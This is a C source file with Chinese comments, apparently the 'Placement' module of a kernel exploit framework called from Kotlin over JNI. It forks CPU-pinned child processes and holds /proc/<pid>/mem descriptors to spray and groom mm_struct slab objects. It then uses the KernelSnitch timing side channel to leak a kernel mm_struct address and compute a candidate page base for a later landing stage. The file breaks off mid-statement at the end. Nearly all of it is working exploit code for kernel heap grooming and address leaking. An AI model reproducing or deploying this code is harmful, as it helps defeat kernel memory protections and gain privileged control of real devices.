/**
 * @file placement.c
 * @brief 43499 Placement 的物理实现：mm 塑形 children/memfd、staging 与定位测量。
 *
 * @note 移植自 2.0.8 `support.cpp:spray_begin/clone_child/clone_leak_child/
 *       open_memfd/prepare_ctxs` 与 `ks_bridge.c` 的物理 syscall 序列，改写为
 *       C11；不 include 也不链接 `legacy` 各子目录。旧 session/route/Flow 层不引入。
 * @note Native 只做物理资源准备与不可暂停的定位事务：不读 profile、不推导
 *       route、不计算最终攻击地址、不生成/解释 payload、不 retry/fallback。
 *       Kotlin 通过 `glk43499_placement_request` 给出全部边界、数量、CPU 与超时。
 * @note 资源所有权：Placement 独占 prepare/spray/pre/post 四组 child+memfd、
 *       staging 缓冲与测量资源。测量完成后测量资源（KernelSnitch 共享区与定位
 *       子进程）当批释放；children/memfd/staging 保留给 landing 使用。
 * @note 失败语义：任何资源创建点的失败都按 stop→join→close→reap 逆序清理，
 *       不留半启动状态；失败回执为 NOT_APPLIED，Placement token 不产生。
 * @note 并发：本文件只被 JNI 串行调用（wrapper 对同一对象串行）；无锁、无全局。
 */

/* KernelSnitch 的 utils.h 使用 GNU sched_setaffinity/cpu_set_t；必须在任何
 * 系统头之前打开 _GNU_SOURCE（只影响本 TU，不改变全局构建选项）。 */
#ifndef _GNU_SOURCE
#define _GNU_SOURCE 1
#endif

#include "placement_internal.h"

#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <unistd.h>

/* KernelSnitch 是 header-only 的 GNU C 检测器；只在本 TU 引入。 */
#include "kernelsnitch/kernelsnitch.h"

/* ========================================================================== */
/* 内部工具                                                                    */
/* ========================================================================== */

/**
 * @brief 分配一组 mm 塑形上下文并初始化为空。
 * @param set 输出组；调用前无需初始化。
 * @param count 组内条目数；0 表示空组。
 * @return 1 成功；0 表示分配失败（errno=ENOMEM，且不留下部分分配）。
 * @note 只分配用户态数组；不创建 child/fd。
 * @note 阶段：Placement 采集的开始。
 */
static int32_t glk43499_placement_ctx_alloc(struct glk43499_ctx_set *set,
                                            uint32_t count) {
    memset(set, 0, sizeof(*set));
    set->count = count;
    if (count == 0) return 1;
    set->children = (pid_t *) calloc((size_t) count, sizeof(pid_t));
    set->memfds = (int32_t *) calloc((size_t) count, sizeof(int32_t));
    if (set->children == NULL || set->memfds == NULL) {
        free(set->children);
        free(set->memfds);
        memset(set, 0, sizeof(*set));
        errno = ENOMEM;
        return 0;
    }
    for (uint32_t index = 0; index < count; ++index) set->memfds[index] = -1;
    return 1;
}

/**
 * @brief 释放一组上下文的用户态数组（不关 fd、不回收 child）。
 * @param set 已初始化的组。
 * @note 释放必须显式且有序：本函数只清数组，资源终结由调用方按序完成。
 */
void glk43499_placement_free_ctx(struct glk43499_ctx_set *set) {
    if (set == NULL) return;
    free(set->children);
    free(set->memfds);
    memset(set, 0, sizeof(*set));
}

/**
 * @brief fork 一个常驻子进程用于 mm 塑形。
 * @param cpu 子进程绑定的 CPU（已校验）。
 * @return 父进程返回子进程 pid（>0）；失败返回 -1（errno 保留）。
 * @note 子进程不返回：设置 PDEATHSIG 后按 CPU 绑定并 `pause()` 至被杀。
 * @note 前提：调用方在父进程内；子进程绝不释放父进程资源。
 * @note 阶段：Placement 采集；属于 `prepare/spray/pre/post` 四组的资源创建点。
 */
static pid_t glk43499_placement_clone_child(uint32_t cpu) {
    const pid_t child =
        (pid_t) syscall(SYS_clone, (unsigned long) SIGCHLD, NULL, NULL, NULL, 0UL);
    if (child != 0) return child; /* 父进程；<0 表示失败 */
    (void) prctl(PR_SET_PDEATHSIG, SIGKILL);
    if (getppid() == 1) _exit(0);
    (void) glk43499_internal_pin_cpu(cpu);
    for (;;) pause();
}

/**
 * @brief fork 定位子进程：在其地址空间内跑 KernelSnitch 碰撞扫描。
 * @param snitch 非空共享状态（MAP_SHARED，父进程仍持有）。
 * @return 父进程返回子进程 pid；失败返回 -1。
 * @note 子进程只在扫描后 `_exit(0)`；扫描线程随进程退出回收。
 * @note 阶段：Placement 采集的测量资源创建点。
 */
static pid_t glk43499_placement_clone_leak_child(
    struct kernelsnitch_shared_state *snitch) {
    const pid_t child =
        (pid_t) syscall(SYS_clone, (unsigned long) SIGCHLD, NULL, NULL, NULL, 0UL);
    if (child != 0) return child;
    (void) prctl(PR_SET_PDEATHSIG, SIGKILL);
    if (getppid() == 1) _exit(0);
    kernelsnitch_find_collisions(snitch);
    _exit(0);
}

/**
 * @brief 打开子进程的 `/proc/<pid>/mem` 描述符。
 * @param child 已存在的子进程 pid。
 * @return 只读描述符；失败返回 -1（errno 保留）。
 * @note 该描述符引用子进程的 mm_struct，是 mm spray 的引用来源。
 * @note 阶段：Placement 采集；每个 child 的成对资源。
 */
static int32_t glk43499_placement_open_memfd(pid_t child) {
    char path[64];
    const int written =
        snprintf(path, sizeof(path), "/proc/%d/mem", (int) child);
    if (written <= 0 || (size_t) written >= sizeof(path)) {
        errno = ENAMETOOLONG;
        return -1;
    }
    return open(path, O_RDONLY | O_CLOEXEC);
}

/**
 * @brief 停止并回收一个子进程（SIGKILL + waitpid）。
 * @param child 子进程 pid；<=0 时直接返回 1。
 * @return 1 已回收或本来不存在；0 表示回收失败（errno 保留）。
 * @note 阶段：Placement 清理阶梯的 stop/reap 两段。
 */
static int32_t glk43499_placement_stop_child(pid_t child) {
    if (child <= 0) return 1;
    if (kill(child, SIGKILL) != 0 && errno != ESRCH) return 0;
    for (;;) {
        const pid_t reaped = waitpid(child, NULL, 0);
        if (reaped == child) return 1;
        if (reaped < 0 && errno == EINTR) continue;
        if (reaped < 0 && errno == ECHILD) return 1;
        if (reaped < 0) return 0;
    }
}

/* ========================================================================== */
/* 上下文组的资源释放（close/landing 共用）                                    */
/* ========================================================================== */

uint32_t glk43499_placement_close_memfds(struct glk43499_ctx_set *set,
                                         int32_t *clean) {
    if (set == NULL || set->memfds == NULL) return 0;
    uint32_t closed = 0;
    for (uint32_t index = 0; index < set->count; ++index) {
        if (set->memfds[index] >= 0) {
            if (close(set->memfds[index]) != 0) {
                /* 失败槽位保留身份，禁止把计数/句柄归零造成假 released。 */
                if (clean != NULL) *clean = 0;
                continue;
            }
            set->memfds[index] = -1;
            ++closed;
            if (set->open_memfds > 0) --set->open_memfds;
        }
    }
    return closed;
}

uint32_t glk43499_placement_close_memfds_stride(struct glk43499_ctx_set *set,
                                                uint32_t stride,
                                                int32_t *clean) {
    if (set == NULL || set->memfds == NULL || stride == 0) return 0;
    uint32_t closed = 0;
    for (uint32_t index = 0; index < set->count; index += stride) {
        if (set->memfds[index] >= 0) {
            if (close(set->memfds[index]) != 0) {
                if (clean != NULL) *clean = 0;
                continue;
            }
            set->memfds[index] = -1;
            ++closed;
            if (set->open_memfds > 0) --set->open_memfds;
        }
    }
    return closed;
}

uint32_t glk43499_placement_close_memfds_except_tail(
    struct glk43499_ctx_set *set, uint32_t keep_tail, int32_t *clean) {
    if (set == NULL || set->memfds == NULL) return 0;
    const uint32_t limit = set->count > keep_tail ? set->count - keep_tail : 0;
    uint32_t closed = 0;
    for (uint32_t index = 0; index < limit; ++index) {
        if (set->memfds[index] >= 0) {
            if (close(set->memfds[index]) != 0) {
                if (clean != NULL) *clean = 0;
                continue;
            }
            set->memfds[index] = -1;
            ++closed;
            if (set->open_memfds > 0) --set->open_memfds;
        }
    }
    return closed;
}

uint32_t glk43499_placement_kill_children(struct glk43499_ctx_set *set,
                                          int32_t *clean) {
    if (set == NULL || set->children == NULL) return 0;
    uint32_t reaped = 0;
    /* stop：先给所有存活 child 发 SIGKILL；失败保留 pid 身份。 */
    for (uint32_t index = 0; index < set->count; ++index) {
        if (set->children[index] > 0) {
            if (kill(set->children[index], SIGKILL) != 0 && errno != ESRCH) {
                if (clean != NULL) *clean = 0;
            }
        }
    }
    (void) glk43499_placement_close_memfds(set, clean);
    /* reap：逐个 waitpid；失败保留 pid 身份，不谎报回收。 */
    for (uint32_t index = 0; index < set->count; ++index) {
        if (set->children[index] > 0) {
            if (glk43499_placement_stop_child(set->children[index])) {
                ++reaped;
                set->children[index] = -1;
                if (set->live_children > 0) --set->live_children;
            } else if (clean != NULL) {
                *clean = 0;
            }
        }
    }
    return reaped;
}

void glk43499_placement_discard_ctx(struct glk43499_ctx_set *set,
                                    int32_t *clean) {
    if (set == NULL) return;
    (void) glk43499_placement_kill_children(set, clean);
    if (clean == NULL || *clean != 0) {
        glk43499_placement_free_ctx(set);
    }
}

void glk43499_placement_detach_contexts(
    struct glk43499_placement_impl *placement,
    struct glk43499_ctx_set *out_prepare, struct glk43499_ctx_set *out_spray,
    struct glk43499_ctx_set *out_pre, struct glk43499_ctx_set *out_post) {
    if (placement == NULL) return;
    *out_prepare = placement->prepare;
    *out_spray = placement->spray;
    *out_pre = placement->pre;
    *out_post = placement->post;
    memset(&placement->prepare, 0, sizeof(placement->prepare));
    memset(&placement->spray, 0, sizeof(placement->spray));
    memset(&placement->pre, 0, sizeof(placement->pre));
    memset(&placement->post, 0, sizeof(placement->post));
}

/**
 * @brief 统计对象当前持有的 children 与描述符数量。
 * @param placement 非空对象。
 * @return 配对计数；children 与 descriptors 通过出参返回。
 */
static void glk43499_placement_account(struct glk43499_placement_impl *placement,
                                       uint32_t *children,
                                       uint32_t *descriptors) {
    uint32_t live = 0;
    uint32_t open_count = 0;
    const struct glk43499_ctx_set *sets[4] = {
        &placement->prepare, &placement->spray, &placement->pre,
        &placement->post,
    };
    for (size_t index = 0; index < sizeof(sets) / sizeof(sets[0]); ++index) {
        live += sets[index]->live_children;
        open_count += sets[index]->open_memfds;
    }
    if (placement->leak_child > 0) ++live;
    if (placement->leak_memfd >= 0) ++open_count;
    *children = live;
    *descriptors = open_count;
}

/** @brief 发布当前资源计数到对象字段（facts 与 retained 回执的唯一来源）。 */
static void glk43499_placement_sync_account(
    struct glk43499_placement_impl *placement) {
    glk43499_placement_account(placement, &placement->retained_children,
                               &placement->retained_descriptors);
}

/**
 * @brief 逆序清理 Placement 已创建的全部物理资源（失败路径专用）。
 * @param placement 非空对象；不会被 free。
 * @note 顺序：stop children → close memfd → reap child；测量共享区先于上述
 *       资源释放（它只服务本次测量）。
 * @note 只在没有 landing 交接可能时调用（采集失败/close）。
 */
static int32_t glk43499_placement_cleanup_all(
    struct glk43499_placement_impl *placement) {
    int32_t clean = 1;
    /* 测量资源：先把 leak child 停下来并回收。 */
    if (placement->leak_child > 0) {
        if (glk43499_placement_stop_child(placement->leak_child)) {
            placement->leak_child = -1;
        } else {
            clean = 0;
        }
    }
    if (placement->leak_memfd >= 0) {
        if (close(placement->leak_memfd) == 0) {
            placement->leak_memfd = -1;
        } else {
            clean = 0;
        }
    }
    struct glk43499_ctx_set *sets[4] = {
        &placement->prepare, &placement->spray, &placement->pre,
        &placement->post,
    };
    for (size_t index = 0; index < sizeof(sets) / sizeof(sets[0]); ++index) {
        (void) glk43499_placement_kill_children(sets[index], &clean);
        if (clean != 0) glk43499_placement_free_ctx(sets[index]);
    }
    glk43499_placement_sync_account(placement);
    return clean;
}

/* ========================================================================== */
/* 采集与测量                                                                  */
/* ========================================================================== */

/**
 * @brief 一次完整的定位采集：建塑形上下文、跑扫描、泄漏 mm_struct、算候选页。
 * @param placement 已填好验证事实的对象。
 * @param round 当前测量轮次（1 起），用于测量事实。
 * @param deadline_ns 本次 prepare 的绝对 deadline。
 * @param system_error 失败时写入 errno 语义的错误码；0 表示超时/未知。
 * @return 1 成功（对象持有 children/memfd/staging 与候选页事实）；0 失败（资源已清）。
 * @note 失败语义：本函数保证失败时不留下半启动资源；不消费任何 token。
 * @note 阶段：preparePlacement 的 commit 前采集；无 PI 窗口、无日志。
 */
static int32_t glk43499_placement_acquire(
    struct glk43499_placement_impl *placement, uint32_t round,
    uint64_t deadline_ns, int32_t *system_error) {
    struct kernelsnitch_shared_state *snitch = NULL;
    int32_t success = 0;
    *system_error = 0;

    const uint32_t objects = placement->objects_per_slab;
    const uint32_t prepare_count = objects * (uint32_t) GLK43499_PHYS_PREPARE_SLABS;
    const uint32_t spray_count =
        objects * (uint32_t) (1 + GLK43499_PHYS_MM_PARTIALS);
    const uint32_t pre_count = objects - 1;
    const uint32_t post_count = objects;

    if (placement->prepare.count != 0 || placement->spray.count != 0 ||
        placement->pre.count != 0 || placement->post.count != 0) {
        /* 上一轮必须已完整清理；否则状态不可证明，拒绝继续。 */
        *system_error = EBUSY;
        return 0;
    }

    if (!glk43499_placement_ctx_alloc(&placement->prepare, prepare_count) ||
        !glk43499_placement_ctx_alloc(&placement->spray, spray_count) ||
        !glk43499_placement_ctx_alloc(&placement->pre, pre_count) ||
        !glk43499_placement_ctx_alloc(&placement->post, post_count)) {
        *system_error = ENOMEM;
        goto fail;
    }
    glk43499_placement_sync_account(placement);

    /* mm 塑形子进程按 placement_cpu 绑定；父进程采集期同样绑定。 */
    if (glk43499_internal_pin_cpu(placement->placement_cpu) != 0) {
        *system_error = errno;
        goto fail;
    }

    for (uint32_t index = 0; index < prepare_count; ++index) {
        const pid_t child =
            glk43499_placement_clone_child(placement->placement_cpu);
        if (child < 0) {
            *system_error = errno;
            goto fail;
        }
        placement->prepare.children[index] = child;
        ++placement->prepare.live_children;
        const int32_t memfd = glk43499_placement_open_memfd(child);
        if (memfd < 0) {
            *system_error = errno;
            goto fail;
        }
        placement->prepare.memfds[index] = memfd;
        ++placement->prepare.open_memfds;
    }
    for (uint32_t index = 0; index < spray_count; ++index) {
        const pid_t child =
            glk43499_placement_clone_child(placement->placement_cpu);
        if (child < 0) {
            *system_error = errno;
            goto fail;
        }
        placement->spray.children[index] = child;
        ++placement->spray.live_children;
        const int32_t memfd = glk43499_placement_open_memfd(child);
        if (memfd < 0) {
            *system_error = errno;
            goto fail;
        }
        placement->spray.memfds[index] = memfd;
        ++placement->spray.open_memfds;
    }

    {
        long online = sysconf(_SC_NPROCESSORS_ONLN);
        if (online <= 0) online = 1;
        snitch = kernelsnitch_setup(
            (size_t) GLK43499_PHYS_MM_STRUCT_SIZE,
            (size_t) GLK43499_PHYS_SLAB_ORDER, (size_t) online,
            (size_t) GLK43499_PHYS_SNITCH_COLLISIONS, 0,
            (int) placement->placement_cpu);
    }
    if (snitch == NULL) {
        *system_error = ENOMEM;
        goto fail;
    }
    glk43499_placement_sync_account(placement);

    if (glk43499_internal_pin_cpu(placement->measurement_cpu) != 0) {
        *system_error = errno;
        goto fail;
    }

    for (uint32_t index = 0; index < pre_count; ++index) {
        const pid_t child =
            glk43499_placement_clone_child(placement->placement_cpu);
        if (child < 0) {
            *system_error = errno;
            goto fail;
        }
        placement->pre.children[index] = child;
        ++placement->pre.live_children;
    }
    placement->leak_child = glk43499_placement_clone_leak_child(snitch);
    if (placement->leak_child < 0) {
        *system_error = errno;
        goto fail;
    }
    for (uint32_t index = 0; index < post_count; ++index) {
        const pid_t child =
            glk43499_placement_clone_child(placement->placement_cpu);
        if (child < 0) {
            *system_error = errno;
            goto fail;
        }
        placement->post.children[index] = child;
        ++placement->post.live_children;
    }

    for (uint32_t index = 0; index < pre_count; ++index) {
        const int32_t memfd =
            glk43499_placement_open_memfd(placement->pre.children[index]);
        if (memfd < 0) {
            *system_error = errno;
            goto fail;
        }
        placement->pre.memfds[index] = memfd;
        ++placement->pre.open_memfds;
    }
    placement->leak_memfd =
        glk43499_placement_open_memfd(placement->leak_child);
    if (placement->leak_memfd < 0) {
        *system_error = errno;
        goto fail;
    }
    for (uint32_t index = 0; index < post_count; ++index) {
        const int32_t memfd =
            glk43499_placement_open_memfd(placement->post.children[index]);
        if (memfd < 0) {
            *system_error = errno;
            goto fail;
        }
        placement->post.memfds[index] = memfd;
        ++placement->post.open_memfds;
    }
    glk43499_placement_sync_account(placement);

    /* 塑形形状已就绪：pre/post/spray 的子进程先停，memfd 保持以持有 mm_struct。 */
    struct glk43499_ctx_set *killed[3] = {
        &placement->pre, &placement->post, &placement->spray,
    };
    for (size_t set_index = 0; set_index < sizeof(killed) / sizeof(killed[0]);
         ++set_index) {
        struct glk43499_ctx_set *set = killed[set_index];
        for (uint32_t index = 0; index < set->count; ++index) {
            const pid_t child = set->children[index];
            if (child <= 0) continue;
            if (glk43499_placement_stop_child(child)) {
                set->children[index] = -1;
                --set->live_children;
            } else {
                *system_error = errno;
                goto fail;
            }
        }
    }
    glk43499_placement_sync_account(placement);

    /* 等待定位子进程完成扫描；扫描自身有内核侧超时，这里再加一层 deadline。 */
    for (;;) {
        int status = 0;
        const pid_t reaped = waitpid(placement->leak_child, &status, WNOHANG);
        if (reaped == placement->leak_child) {
            placement->leak_child = -1;
            if (!WIFEXITED(status) || WEXITSTATUS(status) != 0) {
                *system_error = ECHILD;
                goto fail;
            }
            break;
        }
        if (reaped < 0) {
            if (errno == EINTR) continue;
            *system_error = errno;
            goto fail;
        }
        if (glk43499_internal_expired(deadline_ns)) {
            (void) glk43499_placement_stop_child(placement->leak_child);
            placement->leak_child = -1;
            *system_error = ETIMEDOUT;
            goto fail;
        }
        (void) usleep((useconds_t) GLK43499_PHYS_POLL_US);
    }
    glk43499_placement_sync_account(placement);

    if (kernelsnitch_found_collisions(snitch) == 0) {
        *system_error = EAGAIN;
        goto fail;
    }

    /* 泄漏阶段：bruteforce 会把亲缘 affinity 复原成全核，必须重新绑定。 */
    kernelsnitch_bruteforce(snitch);
    (void) glk43499_internal_pin_cpu(placement->measurement_cpu);
    {
        const size_t leaked_raw = snitch->mm_struct;
        (void) kernelsnitch_cleanup(snitch);
        snitch = NULL;
        if (leaked_raw == (size_t) -1) {
            *system_error = EAGAIN;
            goto fail;
        }
        uint64_t leaked = (uint64_t) leaked_raw;
        leaked |= GLK43499_PHYS_LEAK_TAG_NIBBLE << GLK43499_PHYS_LEAK_TAG_SHIFT;
        if (leaked < GLK43499_PHYS_IDENTITY_START ||
            leaked >= GLK43499_PHYS_IDENTITY_END ||
            leaked < placement->scan_lower_bound ||
            leaked >= placement->scan_upper_bound) {
            *system_error = ERANGE;
            goto fail;
        }
        const uint64_t base = leaked & ~(placement->allocation_size - 1);
        if (base % placement->required_alignment != 0 ||
            base % placement->scan_step != 0) {
            *system_error = ERANGE;
            goto fail;
        }
        placement->measured_object_address = leaked;
        placement->candidate_page_base = base;
        placement->measurement_rounds = round;
    }
    success = 1;

fail:
    if (snitch != NULL) {
        (void) kernelsnitch_cleanup(snitch);
        snitch = NULL;
    }
    if (!success) {
        if (glk43499_placement_cleanup_all(placement) == 0) {
            /* 清理无法证明完整：保留对象与身份，由调用方报 DIRTY/retained。 */
            placement->retained = 1;
        }
    }
    return success;
}

/* ========================================================================== */
/* 请求校验                                                                    */
/* ========================================================================== */

/**
 * @brief 校验 Placement 请求的物理参数并填充对象事实。
 * @param request 已通过 ABI 头校验的请求。
 * @param placement 非空对象（只写输入事实字段）。
 * @return 1 接受；0 拒绝（调用方回 INVALID_ARGUMENT）。
 * @note 只做非零/范围/对齐/溢出/物理上限校验；不填默认值、不做整数回绕。
 * @note 阶段：preparePlacement 的 commit 前校验。
 */
static int32_t glk43499_placement_validate(
    const struct glk43499_placement_request *request,
    struct glk43499_placement_impl *placement) {
    if (!glk43499_internal_valid_header(&request->abi,
                                        (uint32_t) sizeof(*request)) ||
        request->reserved32 != 0 ||
        !glk43499_internal_zero_u64(
            request->reserved,
            sizeof(request->reserved) / sizeof(request->reserved[0]))) {
        return 0;
    }
    /* 页几何：候选页基址的 mask 必须与本机物理页/slab 几何一致。 */
    if (request->page_size != GLK43499_PHYS_PAGE_SIZE ||
        request->allocation_size != GLK43499_PHYS_ALLOCATION_SIZE) {
        return 0;
    }
    if (!glk43499_internal_valid_pow2(request->required_alignment) ||
        request->required_alignment > request->allocation_size ||
        request->allocation_size % request->required_alignment != 0) {
        return 0;
    }
    if (!glk43499_internal_valid_pow2(request->scan_step) ||
        request->scan_step > request->allocation_size ||
        request->allocation_size % request->scan_step != 0) {
        return 0;
    }
    if (request->scan_lower_bound < GLK43499_PHYS_IDENTITY_START ||
        request->scan_upper_bound <= request->scan_lower_bound ||
        request->scan_upper_bound > GLK43499_PHYS_IDENTITY_END) {
        return 0;
    }
    if (request->scan_round_limit == 0 ||
        request->scan_round_limit > GLK43499_PHYS_MAX_MEASUREMENT_ROUNDS) {
        return 0;
    }
    if (request->timeout_ns == 0 ||
        request->timeout_ns > UINT64_C(3600000000000)) {
        return 0;
    }
    if (!glk43499_internal_valid_cpu(request->placement_cpu) ||
        !glk43499_internal_valid_cpu(request->measurement_cpu)) {
        return 0;
    }
    /* 数量形状是物理事实（旧实现固定 8 / 1+5 / objs-1 / objs），不是默认值。 */
    if (request->objects_per_slab == 0 ||
        request->objects_per_slab > GLK43499_PHYS_MAX_OBJECTS_PER_SLAB ||
        request->objects_per_slab != GLK43499_PHYS_OBJECTS_PER_SLAB) {
        return 0;
    }
    const uint64_t objects = request->objects_per_slab;
    if (request->prepare_object_count != objects * GLK43499_PHYS_PREPARE_SLABS ||
        request->spray_object_count !=
            objects * (1 + GLK43499_PHYS_MM_PARTIALS) ||
        request->pre_object_count + 1 != objects ||
        request->post_object_count != objects) {
        return 0;
    }
    if (request->prepare_object_count > GLK43499_PHYS_MAX_CONTEXT_ENTRIES ||
        request->spray_object_count > GLK43499_PHYS_MAX_CONTEXT_ENTRIES ||
        request->pre_object_count > GLK43499_PHYS_MAX_CONTEXT_ENTRIES ||
        request->post_object_count > GLK43499_PHYS_MAX_CONTEXT_ENTRIES) {
        return 0;
    }
    placement->page_size = request->page_size;
    placement->allocation_size = request->allocation_size;
    placement->required_alignment = request->required_alignment;
    placement->scan_lower_bound = request->scan_lower_bound;
    placement->scan_upper_bound = request->scan_upper_bound;
    placement->scan_step = request->scan_step;
    placement->timeout_ns = request->timeout_ns;
    placement->placement_cpu = request->placement_cpu;
    placement->measurement_cpu = request->measurement_cpu;
    placement->objects_per_slab = request->objects_per_slab;
    return 1;
}

/* ========================================================================== */
/* 公开入口                                                                    */
/* ========================================================================== */

/**
 * @brief 创建并完成一次不可拆的定位事务（物理实现）。
 * @param request 调用期借用的完整参数；返回前不再访问该指针。
 * @param result 必填输出；调用方预先填写 result.call.abi。
 * @return Placement handle；失败返回 GLK43499_INVALID_HANDLE。
 * @note 入口顺序：输出 ABI → 输入 ABI/保留字段 → 物理参数 → 采集。
 *       输出 ABI 无效时不写任何输出，直接返回 0。
 * @note 成功对象拥有 children、memfd、staging 与定位事实；测量资源当批释放。
 * @note 阶段：G4L-1；无 PI 窗口。
 */
glk43499_handle glk43499_prepare_placement(
    const struct glk43499_placement_request *request,
    struct glk43499_placement_result *result) {
    if (result == NULL ||
        !glk43499_internal_output_abi(&result->call,
                                      (uint32_t) sizeof(*result))) {
        return GLK43499_INVALID_HANDLE;
    }
    memset(&result->facts, 0, sizeof(result->facts));
    if (request == NULL ||
        !glk43499_internal_valid_header(&request->abi,
                                        (uint32_t) sizeof(*request))) {
        glk43499_internal_set_call(&result->call, GLK43499_CALL_BAD_ABI,
                                   GLK43499_EFFECT_NOT_APPLIED,
                                   GLK43499_RESOURCE_INVALID, 0, 0);
        return GLK43499_INVALID_HANDLE;
    }

    struct glk43499_placement_impl *placement =
        (struct glk43499_placement_impl *) calloc(
            1, sizeof(struct glk43499_placement_impl));
    if (placement == NULL) {
        glk43499_internal_set_call(&result->call, GLK43499_CALL_SYSTEM_ERROR,
                                   GLK43499_EFFECT_NOT_APPLIED,
                                   GLK43499_RESOURCE_INVALID, ENOMEM, 0);
        return GLK43499_INVALID_HANDLE;
    }
    placement->leak_child = -1;
    placement->leak_memfd = -1;

    if (!glk43499_placement_validate(request, placement)) {
        free(placement);
        glk43499_internal_set_call(&result->call, GLK43499_CALL_INVALID_ARGUMENT,
                                   GLK43499_EFFECT_NOT_APPLIED,
                                   GLK43499_RESOURCE_INVALID, 0, 0);
        return GLK43499_INVALID_HANDLE;
    }

    const uint64_t deadline_ns = glk43499_internal_deadline(placement->timeout_ns);
    int32_t accepted = 0;
    int32_t last_error = 0;
    for (uint32_t round = 1; round <= (uint32_t) request->scan_round_limit;
         ++round) {
        if (glk43499_internal_expired(deadline_ns)) {
            last_error = ETIMEDOUT;
            break;
        }
        if (glk43499_placement_acquire(placement, round, deadline_ns,
                                       &last_error)) {
            accepted = 1;
            break;
        }
        if (last_error == ETIMEDOUT) break;
        if (last_error == ENOMEM) break;
    }

    if (!accepted) {
        if (placement->retained != 0) {
            /* 清理不干净：对象/身份保留到进程退出，回执必须报 retained。 */
            glk43499_placement_sync_account(placement);
            const uint64_t retained =
                (uint64_t) placement->retained_children +
                (uint64_t) placement->retained_descriptors;
            glk43499_internal_set_call(&result->call, GLK43499_CALL_SYSTEM_ERROR,
                                       GLK43499_EFFECT_DIRTY,
                                       GLK43499_RESOURCE_QUARANTINED,
                                       last_error, retained);
            return GLK43499_INVALID_HANDLE;
        }
        free(placement);
        const glk43499_call_status status =
            last_error == ETIMEDOUT ? GLK43499_CALL_TIMEOUT
                                    : GLK43499_CALL_SYSTEM_ERROR;
        glk43499_internal_set_call(&result->call, status,
                                   GLK43499_EFFECT_NOT_APPLIED,
                                   GLK43499_RESOURCE_INVALID, last_error, 0);
        return GLK43499_INVALID_HANDLE;
    }

    glk43499_placement_sync_account(placement);
    result->facts.candidate_page_base = placement->candidate_page_base;
    result->facts.page_size = placement->page_size;
    result->facts.allocation_size = placement->allocation_size;
    result->facts.required_alignment = placement->required_alignment;
    result->facts.measured_object_address = placement->measured_object_address;
    result->facts.measurement_rounds = placement->measurement_rounds;
    result->facts.retained_child_count = placement->retained_children;
    result->facts.retained_descriptor_count = placement->retained_descriptors;
    for (size_t index = 0;
         index < sizeof(result->facts.reserved) /
                     sizeof(result->facts.reserved[0]);
         ++index) {
        result->facts.reserved[index] = 0;
    }
    glk43499_internal_set_call(&result->call, GLK43499_CALL_OK,
                               GLK43499_EFFECT_CLEAN_SUCCESS,
                               GLK43499_RESOURCE_PREPARED, 0, 0);
    placement->state = 0;
    return glk43499_internal_ptr_handle(placement);
}

/**
 * @brief 请求停止尚未进入 Landing 提交段的 Placement。
 * @param placement 有效 Placement handle。
 * @param result 必填输出。
 * @return glk43499_call_status；输出 ABI 无效或 token 为 0 时返回拒绝且不消费。
 * @note Placement 的 prepare 是同步事务：返回时没有在飞工作，cancel 只做
 *       「停止新触发并排空」的空操作，不销毁 handle、不消费 token。
 * @note 阶段：G4L-1。
 */
int32_t glk43499_cancel_placement(glk43499_handle placement,
                                  struct glk43499_close_result *result) {
    if (result == NULL ||
        !glk43499_internal_output_abi(&result->call,
                                      (uint32_t) sizeof(*result))) {
        return GLK43499_CALL_BAD_ABI;
    }
    if (placement == GLK43499_INVALID_HANDLE) {
        glk43499_internal_set_close(result,  GLK43499_CALL_INVALID_ARGUMENT,
                                    GLK43499_EFFECT_NOT_APPLIED,
                                    GLK43499_RESOURCE_INVALID, 0, 0, 0, 0, 0);
        return GLK43499_CALL_INVALID_ARGUMENT;
    }
    struct glk43499_placement_impl *impl = glk43499_placement_from_handle(placement);
    glk43499_internal_set_close(result,  GLK43499_CALL_OK,
                                GLK43499_EFFECT_NOT_APPLIED,
                                GLK43499_RESOURCE_PREPARED, 0, 1, 0, 0, 0);
    (void) impl; /* 同步事务没有在飞 worker：停止已由返回点保证。 */
    return GLK43499_CALL_OK;
}

/**
 * @brief 终结 Placement 或报告其被保留到进程退出。
 * @param placement 仍由调用方唯一持有的 Placement token；wrapper 在调用前置 0。
 * @param result 必填输出。
 * @return glk43499_call_status；输出 ABI 无效或 token 为 0 时未接受（调用方
 *         恢复原 token）；一旦接受，无论完整释放或保留都消费 token。
 * @note 释放顺序：stop children → close memfd → reap child；无法完整回收的
 *       闭包整体保留到进程退出（不 free 对象，不关残余 fd）。
 * @note 阶段：G4L-1 终结。
 */
int32_t glk43499_close_placement(glk43499_handle placement,
                                 struct glk43499_close_result *result) {
    if (result == NULL ||
        !glk43499_internal_output_abi(&result->call,
                                      (uint32_t) sizeof(*result))) {
        return GLK43499_CALL_BAD_ABI;
    }
    if (placement == GLK43499_INVALID_HANDLE) {
        glk43499_internal_set_close(result, GLK43499_CALL_INVALID_ARGUMENT,
                                    GLK43499_EFFECT_NOT_APPLIED,
                                    GLK43499_RESOURCE_INVALID, 0, 0, 0, 0, 0);
        return GLK43499_CALL_INVALID_ARGUMENT;
    }

    struct glk43499_placement_impl *impl = glk43499_placement_from_handle(placement);
    impl->state = 1;
    const uint32_t expected_children = impl->retained_children;
    const uint32_t expected_descriptors = impl->retained_descriptors;
    int32_t clean = 1;
    uint32_t reaped = 0;

    /* 释放顺序：stop → close fd → reap child；每步都记账，失败保留身份。 */
    if (impl->leak_child > 0) {
        if (glk43499_placement_stop_child(impl->leak_child)) {
            ++reaped;
            impl->leak_child = -1;
        } else {
            clean = 0;
        }
    }
    if (impl->leak_memfd >= 0) {
        if (close(impl->leak_memfd) == 0) {
            impl->leak_memfd = -1;
        } else {
            clean = 0;
        }
    }
    struct glk43499_ctx_set *sets[4] = {
        &impl->prepare, &impl->spray, &impl->pre, &impl->post,
    };
    for (size_t index = 0; index < sizeof(sets) / sizeof(sets[0]); ++index) {
        reaped += glk43499_placement_kill_children(sets[index], &clean);
    }
    glk43499_placement_sync_account(impl);

    const int32_t fully_released = clean != 0 &&
                                   reaped == expected_children &&
                                   impl->retained_children == 0 &&
                                   impl->retained_descriptors == 0;
    (void) expected_descriptors;
    if (!fully_released) {
        impl->retained = 1;
        glk43499_internal_set_close(result, GLK43499_CALL_SYSTEM_ERROR,
                                    GLK43499_EFFECT_DIRTY,
                                    GLK43499_RESOURCE_QUARANTINED, 0, 1, 0, 0,
                                    1);
        result->call.retained_resource_count =
            (uint64_t) impl->retained_children +
